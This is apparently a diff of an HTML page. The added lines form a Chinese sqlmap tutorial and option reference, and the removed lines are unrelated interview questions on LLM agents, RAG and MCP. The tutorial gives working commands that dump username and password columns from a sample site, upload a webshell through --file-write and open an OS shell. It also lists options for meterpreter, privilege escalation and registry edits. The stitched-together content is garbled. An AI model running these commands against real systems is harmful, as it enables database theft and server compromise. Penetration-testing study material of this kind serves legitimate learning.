+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 --dbs
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询有哪些数据库
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test --tables
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中有哪些表
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin --columns
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中admin表有哪些字段
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin -C "username,password" --dump
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	dump出字段username与password中的数据
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	其他命令参考下面
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从数据库中搜索字段
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password<br />
+在dedecms数据库中搜索字段admin或者password。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	读取与写入文件
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	首先找需要网站的物理路径，其次需要有可写或可读权限。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br />
+--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br />
+--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br />
+#示例：<br />
+sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	使用shell命令：
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell<br />
+接下来指定网站可写目录：<br />
+“E:\php\htdocs\dvwa”
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap详细命令：
+</h2>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 当前用户权限（是否为root权限）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 所有数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 网站当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 所有数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 当前数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 构造随机user-agent
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 数据库密码
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
 </ul>
-<p><strong>2. 题目：您在项目中使用了 LangGraph 与 Dify，对于复杂的工作流，如何解决 Agent 可能出现的逻辑偏差或死循环？</strong></p>
-<ul>
-<li><strong>参考答案要点：</strong><ul>
-<li>[cite_start]<strong>状态机管理：</strong> 利用 LangGraph 等工具将“问答、自动化、浏览器操作”统一为可编排的工作流，通过显式的状态转移控制逻辑 [cite: 8, 22]。</li>
-<li>[cite_start]<strong>异常归因：</strong> 建立失败案例归因机制（如检索偏差、切块问题或模型偏离），并形成修复闭环 [cite: 23]。</li>
-<li>[cite_start]<strong>工具沙箱：</strong> 在受控的工具沙箱中运行 Agent 逻辑，配合提示注入防护确保流程不被非法篡改 [cite: 4, 23]。</li>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	——————————————————————————————————
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Options（选项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--version 显示程序的版本号并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-h, --help 显示此帮助消息并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-v VERBOSE 详细级别：0-6（默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		保存进度继续跑：
+	</li>
 </ul>
-</li>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br style="color:#444444;" />
+<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span>
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Target（目标）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	以下至少需要设置其中一个选项，设置目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-d DIRECT 直接连接到数据库。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-u URL, --url=URL 目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-l LIST 从Burp或WebScarab代理的日志中解析目标。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-r REQUESTFILE 从一个文件中载入HTTP请求。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-g GOOGLEDORK 处理Google dork的结果作为目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-c CONFIGFILE 从INI配置文件中加载选项。
+	</li>
 </ul>
-<hr>
-<h2 id="二、-RAG-工程化与检索深度"><a href="#二、-RAG-工程化与检索深度" class="headerlink" title="二、 RAG 工程化与检索深度"></a>二、 RAG 工程化与检索深度</h2><p><strong>3. 题目：简历中提到您搭建了支持“混合检索 + 重排”的 RAG 体系，请问如何优化检索的准确性与引用可信度？</strong></p>
-<ul>
-<li><strong>参考答案要点：</strong><ul>
-<li>[cite_start]<strong>多路召回：</strong> 采用 Hybrid 检索（BM25 + 向量）结合 rerank 重排，提升文档召回的相关性 [cite: 4, 9]。</li>
-<li>[cite_start]<strong>引用校验：</strong> 实施强制引用（citation）策略与答案置信度门控，对于低置信度结果采取拒答策略，防止模型幻觉 [cite: 4, 9]。</li>
-<li>[cite_start]<strong>精细化解析：</strong> 针对 PDF&#x2F;HTML 等文档进行版面分块与去噪，支持多知识域隔离，确保检索源头数据的质量 [cite: 9]。</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Request（请求）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定如何连接到目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--data=DATA 通过POST发送的数据字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie=COOKIE HTTP Cookie头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie-urlencode URL 编码生成的cookie注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--drop-set-cookie 忽略响应的Set - Cookie头信息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--user-agent=AGENT 指定 HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 使用随机选定的HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--referer=REFERER 指定 HTTP Referer头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--headers=HEADERS 换行分开，加入其他的HTTP头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cert=ACERT HTTP认证证书（key_file，cert_file）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy=PROXY 使用HTTP代理连接到目标URL
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--ignore-proxy 忽略系统默认的HTTP代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--retries=RETRIES 连接超时后重新连接的时间（默认3）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-url=SAFURL 在测试过程中经常访问的url地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
+	</li>
 </ul>
-</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Enumeration（枚举）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br />
+您自己的SQL语句。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-b, --banner 检索数据库管理系统的标识
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 检索数据库管理系统当前用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 检索数据库管理系统当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 检测DBMS当前用户是否DBA
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 枚举数据库管理系统用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 枚举数据库管理系统用户密码哈希
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--privileges 枚举数据库管理系统用户的权限
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--roles 枚举数据库管理系统用户的角色
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 枚举数据库管理系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-D DBname 要进行枚举的指定数据库名
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tables 枚举的DBMS数据库中的表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--columns 枚举DBMS数据库表列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump 转储数据库管理系统的数据库中的表项
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump-all 转储所有的DBMS数据库表中的条目
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--search 搜索列（S），表（S）和/或数据库名称（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-C COL 要进行枚举的数据库列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-U USER 用来进行枚举的数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--exclude-sysdbs 枚举表时排除系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--start=LIMITSTART 第一个查询输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--stop=LIMITSTOP 最后查询的输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--first=FIRSTCHAR 第一个查询输出字的字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--last=LASTCHAR 最后查询的输出字字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-query=QUERY 要执行的SQL语句
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-shell 提示交互式SQL的shell
+	</li>
 </ul>
-<p><strong>4. 题目：对于 MCP (Model Context Protocol) 协议，您如何理解其在 Agent 工具化接入中的价值？</strong></p>
-<ul>
-<li><strong>参考答案要点：</strong><ul>
-<li>[cite_start]<strong>标准化接入：</strong> 能够将内部系统以标准化的“工具”形态接入 Agent，实现本地与远程两种调用形态的复用 [cite: 2, 26]。</li>
-<li>[cite_start]<strong>最小权限原则：</strong> 按“最小权限 + 可观测 + 可回放”原则封装操作，提升多 Agent 复用时的安全性 [cite: 27]。</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Optimization（优化）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于优化SqlMap的性能。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-o 开启所有优化开关
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--predict-output 预测常见的查询输出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--keep-alive 使用持久的HTTP（S）连接
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--null-connection 从没有实际的HTTP响应体中检索页面长度
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
+	</li>
 </ul>
-</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Injection（注入）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-p TESTPARAMETER 可测试的参数（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbms=DBMS 强制后端的DBMS为此值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os=OS 强制后端的DBMS操作系统为这个值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--prefix=PREFIX 注入payload字符串前缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--suffix=SUFFIX 注入payload字符串后缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tamper=TAMPER 使用给定的脚本（S）篡改注入数据
+	</li>
 </ul>
-<hr>
-<h2 id="三、-工程化保障与自动化提效"><a href="#三、-工程化保障与自动化提效" class="headerlink" title="三、 工程化保障与自动化提效"></a>三、 工程化保障与自动化提效</h2><p><strong>5. 题目：如何通过可观测性（Observability）体系保障企业级 LLM 应用的 SLA？</strong></p>
-<ul>
-<li><strong>参考答案要点：</strong><ul>
-<li>[cite_start]<strong>全链路观测：</strong> 引入可观测性工具进行链路追踪（Trace）、指标监控（Metrics）与日志审计（Logs） [cite: 4, 12]。</li>
-<li>[cite_start]<strong>成本看板：</strong> 建立按租户、模型或链路分摊的成本看板，实现 SLA 告警闭环 [cite: 12]。</li>
-<li>[cite_start]<strong>工程化部署：</strong> 利用 Docker 化部署、CI&#x2F;CD (GitHub Actions) 以及灰度发布与回滚机制确保线上稳定 [cite: 4, 12]。</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Detection（检测）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--level=LEVEL 执行测试的等级（1-5，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--risk=RISK 执行测试的风险（0-3，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--string=STRING 查询时有效时在页面匹配字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--regexp=REGEXP 查询时有效时在页面匹配正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--text-only 仅基于在文本内容比较网页
+	</li>
 </ul>
-</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Techniques（技巧）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于调整具体的SQL注入测试。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--technique=TECH SQL注入技术测试（默认BEUST）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-cols=UCOLS 定列范围用于测试UNION查询注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-char=UCHAR 用于暴力猜解列数的字符
+	</li>
 </ul>
-<p><strong>6. 题目：Playwright 在您的 Agent 体系中除了数据采集，还承担了哪些关键任务？</strong></p>
-<ul>
-<li><strong>参考答案要点：</strong><ul>
-<li>[cite_start]<strong>能力增强：</strong> 为 Agent 提供登录态管理、元素定位及表单流程回放等可控的浏览器操作能力 [cite: 13, 29]。</li>
-<li>[cite_start]<strong>自动化验收：</strong> 将回归脚本接入 CI 流程，在发布前对关键路径做自动化验收，提升交付稳定性 [cite: 30]。</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Fingerprint（指纹）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-f, --fingerprint 执行检查广泛的DBMS版本指纹
+	</li>
 </ul>
-</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Brute force（蛮力）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来运行蛮力检查。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-tables 检查存在共同表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-columns 检查存在共同列
+	</li>
 </ul>
-<hr>
-<h2 id="四、-综合能力与背景"><a href="#四、-综合能力与背景" class="headerlink" title="四、 综合能力与背景"></a>四、 综合能力与背景</h2><p><strong>7. 题目：您提到利用 AI 辅助开发（如 Cursor&#x2F;Claude Code）显著缩短了交付周期，具体的落地实践是什么？</strong></p>
-<ul>
-<li><strong>参考答案要点：</strong><ul>
-<li>[cite_start]<strong>流程提效：</strong> 沉淀 spec 模板、测试用例生成及回归脚本脚手架，实现需求拆解到部署的全流程提效 [cite: 2, 11]。</li>
-<li>[cite_start]<strong>项目经验：</strong> 已支撑 15+ 业务应用落地，在实际场景中（如工单处理）验证了约 35% 的效率提升 [cite: 24]。</li>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	User-defined function injection（用户自定义函数注入）：<br />
+这些选项可以用来创建用户自定义函数。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--udf-inject 注入用户自定义函数<br />
+--shared-lib=SHLIB 共享库的本地路径
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	File system access（访问文件系统）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+	</li>
 </ul>
-</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Operating system access（操作系统访问）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用于访问后端数据库管理系统的底层操作系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-cmd=OSCMD 执行操作系统命令
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-shell 交互式的操作系统的shell
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-pwn 获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-bof 存储过程缓冲区溢出利用
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--priv-esc 数据库进程用户权限提升
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--msf-path=MSFPATH Metasploit Framework本地的安装路径
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tmp-path=TMPPATH 远程临时文件目录的绝对路径
+	</li>
 </ul>
-<hr>
-<h3 id="💡-面试考察建议"><a href="#💡-面试考察建议" class="headerlink" title="💡 面试考察建议"></a>💡 面试考察建议</h3><p>[cite_start]牛一拥有 <strong>8 年工程经验</strong> 且背景扎实（北邮硕士，研究方向为检索增强生成） [cite: 2, 32]。面试时应重点关注其在 <strong>“生产环境下的异常处理”</strong> 与 <strong>“复杂业务流的工程化拆解”</strong> 能力，这能体现其作为高级工程师在 AI 落地中的核心价值。</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Windows注册表访问：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统Windows注册表。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-read 读一个Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-add 写一个Windows注册表项值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-del 删除Windows注册表键值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-key=REGKEY Windows注册表键
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-value=REGVAL Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-data=REGDATA Windows注册表键值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-type=REGTYPE Windows注册表项值类型
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来设置一些一般的工作参数。
+</p>
